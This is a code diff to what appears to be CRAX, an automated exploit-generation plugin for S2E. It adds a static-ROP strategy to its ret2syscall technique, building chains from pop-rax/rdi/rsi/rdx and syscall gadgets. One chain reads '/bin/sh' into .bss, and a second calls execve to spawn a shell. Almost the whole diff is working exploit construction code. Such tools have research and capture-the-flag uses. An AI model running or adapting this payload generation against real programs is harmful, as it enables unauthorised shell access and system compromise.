@@ -32,25 +32,33 @@ namespace s2e::plugins::crax {
 
 Ret2syscall::Ret2syscall()
     : Technique(),
-      m_syscallGadget() {
+      m_syscallGadget(),
+      m_strategy() {
     m_hasPopulatedRequiredGadgets = false;
 
     std::thread([this]() {
         const Exploit &exploit = g_crax->getExploit();
         const ELF &elf = exploit.getElf();
         const ELF &libc = exploit.getLibc();
-        const std::string gadgetAsm = "syscall ; ret";
 
-        if (exploit.resolveGadget(elf, gadgetAsm)) {
-            m_requiredGadgets.push_back(std::make_pair(&elf, gadgetAsm));
-
-            m_syscallGadget
-                = BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, gadgetAsm));
+        if (exploit.resolveGadget(elf, "pop rax ; ret") &&
+            exploit.resolveGadget(elf, "pop rdi ; ret") &&
+            exploit.resolveGadget(elf, "pop rsi ; ret") &&
+            exploit.resolveGadget(elf, "pop rdx ; ret") &&
+            exploit.resolveGadget(elf, "syscall")) {
+            m_strategy = Strategy::STATIC_ROP;
+            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rax ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdi ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rsi ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdx ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&elf, "syscall"));
 
         } else if (!elf.checksec.hasFullRELRO && elf.hasSymbol("read")) {
+            m_strategy = Strategy::GOT_HIJACKING_ROP;
             m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
 
         } else {
+            m_strategy = Strategy::LIBC_ROP;
             m_requiredGadgets.push_back(std::make_pair(&libc, "pop rax ; ret"));
             m_requiredGadgets.push_back(std::make_pair(&libc, "pop rdi ; ret"));
             m_requiredGadgets.push_back(std::make_pair(&libc, "pop rsi ; ret"));
@@ -64,12 +72,59 @@ Ret2syscall::Ret2syscall()
 
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
-    // If we've already leaked libc base, then use the gadgets from libc.
-    if (m_syscallGadget) {
-        return getRopPayloadListUsingGotHijacking();
-    } else {
-        return getRopPayloadListUsingLibcRop();
+    switch (m_strategy) {
+        case Strategy::STATIC_ROP:
+            return getRopPayloadListUsingStaticRop();
+        case Strategy::GOT_HIJACKING_ROP:
+            return getRopPayloadListUsingGotHijackingRop();
+        case Strategy::LIBC_ROP:
+            [[fallthrough]];
+        default:
+            return getRopPayloadListUsingLibcRop();
     }
+}
+
+std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingStaticRop() const {
+    Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    // sys_read(0, elf.bss(), 59)
+    // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
+    RopPayload part1 = {
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rax ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rsi ; ret")),
+        BaseOffsetExpr::create<BaseType::BSS>(elf),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdx ; ret")),
+        ConstantExpr::create(59, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "syscall")),
+    };
+
+    // sys_execve("/bin/sh", 0, 0)
+    RopPayload part2 = {
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rax ; ret")),
+        ConstantExpr::create(59, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::BSS>(elf),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rsi ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdx ; ret")),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "syscall")),
+    };
+
+    RopPayload ret1;
+    RopPayload ret2;
+
+    ret1.reserve(1 + part1.size() + part2.size());
+    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
+    ret1.insert(ret1.end(), part1.begin(), part1.end());
+    ret1.insert(ret1.end(), part2.begin(), part2.end());
+    ret2 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };
+
+    return { ret1, ret2 };
 }
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
@@ -110,7 +165,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
 
     // sys_execve("/bin/sh", 0, 0)
     RopPayload payload = {
-        ConstantExpr::create(0, Expr::Int64),  // Saved RBP
+        ConstantExpr::create(0, Expr::Int64),  // RBP
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rax ; ret")),
         ConstantExpr::create(59, Expr::Int64),
         BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdi ; ret")),
@@ -125,7 +180,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
     return { payload };
 }
 
-std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijacking() const {
+std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijackingRop() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
